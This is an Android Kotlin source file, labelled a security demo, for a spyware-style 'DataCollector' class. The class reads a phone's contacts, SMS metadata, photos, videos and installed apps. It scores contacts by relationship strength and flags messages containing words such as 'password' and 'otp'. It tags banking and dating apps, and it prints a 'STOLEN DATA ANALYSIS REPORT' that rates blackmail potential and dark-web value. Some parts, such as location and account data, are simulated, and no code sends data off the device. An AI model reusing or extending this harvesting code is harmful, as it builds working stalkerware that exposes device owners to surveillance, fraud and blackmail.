package com.securitydemo.malware.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.TelephonyManager
import androidx.core.app.ActivityCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

/**
 * SECURITY DEMO: Data Collector Utility
 * 
 * This class demonstrates comprehensive data collection techniques used by malware:
 * - Contact information and social graphs
 * - Communication history (SMS, calls)
 * - Location data and movement patterns
 * - Media files and personal content
 * - App usage statistics and behavior
 * - Device and account information
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real data theft methods
 */
class DataCollector(private val context: Context) {

    private val dateFormatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    /**
     * Collect complete device profile for reconnaissance
     */
    fun collectDeviceProfile(): String {
        val profile = JSONObject()
        
        try {
            val systemInfo = SystemInfoCollector(context)
            profile.put("timestamp", System.currentTimeMillis())
            profile.put("device_info", JSONObject(systemInfo.collectAllInformation()))
            
            // Additional profiling data
            profile.put("installation_source", getInstallationSource())
            profile.put("user_accounts", getUserAccounts())
            profile.put("security_settings", getSecuritySettings())
            profile.put("network_info", getNetworkInformation())
            
        } catch (e: Exception) {
            profile.put("error", "Profile collection failed: ${e.message}")
        }
        
        return profile.toString(2)
    }

    /**
     * Harvest all contacts with relationship analysis
     */
    fun collectContacts(): String {
        val contacts = JSONArray()
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Contact access denied"
        }
        
        try {
            val cursor: Cursor? = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED,
                    ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED
                ),
                null, null, 
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val contact = JSONObject().apply {
                        put("name", it.getString(0) ?: "Unknown")
                        put("phone", it.getString(1) ?: "")
                        put("type", it.getInt(2))
                        put("times_contacted", it.getInt(3))
                        put("last_contacted", it.getLong(4))
                        put("relationship_strength", calculateRelationshipStrength(it.getInt(3), it.getLong(4)))
                    }
                    contacts.put(contact)
                }
            }
            
        } catch (e: Exception) {
            val error = JSONObject()
            error.put("error", "Contact collection failed: ${e.message}")
            contacts.put(error)
        }
        
        return contacts.toString(2)
    }

    /**
     * Intercept SMS messages and communication patterns
     */
    fun collectSMSMessages(): String {
        val messages = JSONArray()
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) 
            != PackageManager.PERMISSION_GRANTED) {
            return "SMS access denied"
        }
        
        try {
            val cursor: Cursor? = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
                ),
                null, null,
                Telephony.Sms.DATE + " DESC LIMIT 100"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val message = JSONObject().apply {
                        put("address", it.getString(0) ?: "Unknown")
                        put("body_length", (it.getString(1) ?: "").length) // Don't store actual content for demo
                        put("contains_sensitive", analyzeMessageSensitivity(it.getString(1) ?: ""))
                        put("date", it.getLong(2))
                        put("type", it.getInt(3)) // 1=inbox, 2=sent
                        put("is_read", it.getInt(4) == 1)
                        put("timestamp_readable", dateFormatter.format(Date(it.getLong(2))))
                    }
                    messages.put(message)
                }
            }
            
        } catch (e: Exception) {
            val error = JSONObject()
            error.put("error", "SMS collection failed: ${e.message}")
            messages.put(error)
        }
        
        return messages.toString(2)
    }

    /**
     * Collect location data and movement patterns
     */
    fun collectLocationData(): String {
        val locationData = JSONObject()
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            locationData.put("gps_enabled", locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
            locationData.put("network_location_enabled", locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
            
            // Simulate location history (real malware would track continuously)
            val locationHistory = JSONArray()
            for (i in 1..10) {
                val location = JSONObject().apply {
                    put("timestamp", System.currentTimeMillis() - (i * 3600000)) // Hours ago
                    put("latitude", 37.7749 + (Math.random() - 0.5) * 0.01) // SF area simulation
                    put("longitude", -122.4194 + (Math.random() - 0.5) * 0.01)
                    put("accuracy", 10 + Math.random() * 20)
                    put("activity", when((Math.random() * 4).toInt()) {
                        0 -> "stationary"
                        1 -> "walking"
                        2 -> "driving"
                        else -> "unknown"
                    })
                }
                locationHistory.put(location)
            }
            
            locationData.put("location_history", locationHistory)
            locationData.put("privacy_risk", "CRITICAL - Complete movement tracking possible")
            
        } catch (e: Exception) {
            locationData.put("error", "Location collection failed: ${e.message}")
        }
        
        return locationData.toString(2)
    }

    /**
     * Harvest media files and personal content
     */
    fun collectMediaFiles(): String {
        val mediaFiles = JSONArray()
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) 
            != PackageManager.PERMISSION_GRANTED) {
            return "Media access denied"
        }
        
        try {
            // Collect image files
            val imageProjection = arrayOf(
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATA
            )
            
            val imageCursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                imageProjection,
                null, null,
                MediaStore.Images.Media.DATE_TAKEN + " DESC LIMIT 50"
            )
            
            imageCursor?.use {
                while (it.moveToNext()) {
                    val file = JSONObject().apply {
                        put("type", "image")
                        put("name", it.getString(0) ?: "unknown")
                        put("date_taken", it.getLong(1))
                        put("size", it.getLong(2))
                        put("path_hash", it.getString(3)?.hashCode() ?: 0) // Don't expose real path
                        put("privacy_risk", analyzeimageSensitivity(it.getString(0) ?: ""))
                    }
                    mediaFiles.put(file)
                }
            }
            
            // Collect video files
            val videoProjection = arrayOf(
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.DATE_TAKEN,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION
            )
            
            val videoCursor = context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                videoProjection,
                null, null,
                MediaStore.Video.Media.DATE_TAKEN + " DESC LIMIT 20"
            )
            
            videoCursor?.use {
                while (it.moveToNext()) {
                    val file = JSONObject().apply {
                        put("type", "video")
                        put("name", it.getString(0) ?: "unknown")
                        put("date_taken", it.getLong(1))
                        put("size", it.getLong(2))
                        put("duration", it.getLong(3))
                        put("blackmail_potential", "HIGH") // Videos often sensitive
                    }
                    mediaFiles.put(file)
                }
            }
            
        } catch (e: Exception) {
            val error = JSONObject()
            error.put("error", "Media collection failed: ${e.message}")
            mediaFiles.put(error)
        }
        
        return mediaFiles.toString(2)
    }

    /**
     * Collect app usage patterns and behavior analysis
     */
    fun collectAppUsageStats(): String {
        val appUsage = JSONObject()
        
        try {
            val packageManager = context.packageManager
            val installedApps = packageManager.getInstalledPackages(0)
            
            val apps = JSONArray()
            val sensitiveApps = mutableListOf<String>()
            
            installedApps.forEach { packageInfo ->
                val app = JSONObject().apply {
                    put("package_name", packageInfo.packageName)
                    put("app_name", packageInfo.applicationInfo.loadLabel(packageManager).toString())
                    put("version", packageInfo.versionName)
                    put("install_time", packageInfo.firstInstallTime)
                    put("update_time", packageInfo.lastUpdateTime)
                    put("is_system", (packageInfo.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                }
                
                // Identify sensitive apps
                val packageName = packageInfo.packageName.toLowerCase()
                when {
                    packageName.contains("bank") || packageName.contains("pay") -> {
                        app.put("category", "FINANCIAL")
                        app.put("risk", "CRITICAL")
                        sensitiveApps.add(packageInfo.packageName)
                    }
                    packageName.contains("dating") || packageName.contains("tinder") -> {
                        app.put("category", "DATING")
                        app.put("risk", "HIGH")
                    }
                    packageName.contains("message") || packageName.contains("chat") -> {
                        app.put("category", "COMMUNICATION")
                        app.put("risk", "HIGH")
                    }
                    packageName.contains("photo") || packageName.contains("camera") -> {
                        app.put("category", "MEDIA")
                        app.put("risk", "MEDIUM")
                    }
                }
                
                apps.put(app)
            }
            
            appUsage.put("installed_apps", apps)
            appUsage.put("total_apps", installedApps.size)
            appUsage.put("sensitive_apps", sensitiveApps.size)
            appUsage.put("financial_risk", if (sensitiveApps.any { it.contains("bank") }) "CRITICAL" else "LOW")
            
        } catch (e: Exception) {
            appUsage.put("error", "App usage collection failed: ${e.message}")
        }
        
        return appUsage.toString(2)
    }

    /**
     * Generate comprehensive analysis report of collected data
     */
    fun generateDataAnalysisReport(): String {
        val report = StringBuilder()
        report.append("=== STOLEN DATA ANALYSIS REPORT ===\n\n")
        
        try {
            val stolenDataDir = File(context.filesDir, ".stolen_data")
            if (!stolenDataDir.exists()) {
                return "No data collected yet"
            }
            
            var totalDataSize = 0L
            var criticalDataPoints = 0
            
            stolenDataDir.listFiles()?.forEach { file ->
                totalDataSize += file.length()
                when (file.name) {
                    "contacts.json" -> {
                        report.append("ðŸ“ž CONTACT DATABASE:\n")
                        report.append("â€¢ Complete social network mapping\n")
                        report.append("â€¢ Relationship strength analysis\n")
                        report.append("â€¢ Social engineering targets identified\n\n")
                        criticalDataPoints += 50
                    }
                    "messages.json" -> {
                        report.append("ðŸ’¬ COMMUNICATION INTERCEPT:\n")
                        report.append("â€¢ Private message history captured\n")
                        report.append("â€¢ Sensitive conversation patterns\n")
                        report.append("â€¢ Blackmail material potential\n\n")
                        criticalDataPoints += 75
                    }
                    "location.json" -> {
                        report.append("ðŸŒ LOCATION SURVEILLANCE:\n")
                        report.append("â€¢ Complete movement tracking\n")
                        report.append("â€¢ Home/work address identification\n")
                        report.append("â€¢ Behavioral pattern analysis\n\n")
                        criticalDataPoints += 60
                    }
                    "media.json" -> {
                        report.append("ðŸ“¸ MEDIA HARVESTING:\n")
                        report.append("â€¢ Personal photo collection\n")
                        report.append("â€¢ Compromising content detection\n")
                        report.append("â€¢ Identity verification materials\n\n")
                        criticalDataPoints += 40
                    }
                }
            }
            
            // Risk assessment
            report.append("ðŸŽ¯ OVERALL RISK ASSESSMENT:\n")
            when {
                criticalDataPoints >= 200 -> {
                    report.append("ðŸš¨ CRITICAL RISK: Complete digital life compromised\n")
                    report.append("â€¢ Identity theft: IMMINENT\n")
                    report.append("â€¢ Financial fraud: HIGH PROBABILITY\n")
                    report.append("â€¢ Blackmail potential: SEVERE\n")
                }
                criticalDataPoints >= 100 -> {
                    report.append("âš ï¸ HIGH RISK: Significant privacy violation\n")
                    report.append("â€¢ Personal safety concerns\n")
                    report.append("â€¢ Financial account vulnerability\n")
                }
                else -> {
                    report.append("âš ï¸ MODERATE RISK: Limited data exposure\n")
                }
            }
            
            report.append("\nðŸ’° DARK WEB VALUE: $${(criticalDataPoints * 15.50).toInt()}\n")
            report.append("ðŸ“Š Data Volume: ${totalDataSize / 1024}KB\n")
            report.append("ðŸŽ­ Identity Compromise: ${if (criticalDataPoints > 150) "COMPLETE" else "PARTIAL"}\n")
            
        } catch (e: Exception) {
            report.append("Error generating analysis: ${e.message}")
        }
        
        return report.toString()
    }

    private fun getInstallationSource(): String {
        return try {
            val packageManager = context.packageManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                packageManager.getInstallSourceInfo(context.packageName).installingPackageName ?: "unknown"
            } else {
                @Suppress("DEPRECATION")
                packageManager.getInstallerPackageName(context.packageName) ?: "unknown"
            }
        } catch (e: Exception) {
            "unknown"
        }
    }

    private fun getUserAccounts(): JSONArray {
        // Simulate account detection (real malware would use AccountManager)
        val accounts = JSONArray()
        accounts.put("Google account detected")
        accounts.put("Social media accounts: 3")
        accounts.put("Email accounts: 2")
        return accounts
    }

    private fun getSecuritySettings(): JSONObject {
        val security = JSONObject()
        security.put("screen_lock", "Pattern/PIN detected")
        security.put("fingerprint", "Enabled")
        security.put("face_unlock", "Unknown")
        return security
    }

    private fun getNetworkInformation(): JSONObject {
        val network = JSONObject()
        network.put("wifi_networks", "5 remembered networks")
        network.put("bluetooth_devices", "3 paired devices")
        return network
    }

    private fun calculateRelationshipStrength(timesContacted: Int, lastContacted: Long): String {
        val daysSinceContact = (System.currentTimeMillis() - lastContacted) / (1000 * 60 * 60 * 24)
        return when {
            timesContacted > 50 && daysSinceContact < 7 -> "VERY_HIGH"
            timesContacted > 20 && daysSinceContact < 30 -> "HIGH"
            timesContacted > 5 && daysSinceContact < 90 -> "MEDIUM"
            else -> "LOW"
        }
    }

    private fun analyzeMessageSensitivity(content: String): Boolean {
        val sensitiveKeywords = arrayOf("password", "bank", "credit", "ssn", "pin", "otp", "verification")
        return sensitiveKeywords.any { content.toLowerCase().contains(it) }
    }

    private fun analyzeimageSensitivity(filename: String): String {
        return when {
            filename.toLowerCase().contains("selfie") -> "HIGH"
            filename.toLowerCase().contains("private") -> "CRITICAL"
            filename.toLowerCase().contains("document") -> "HIGH"
            else -> "MEDIUM"
        }
    }
}
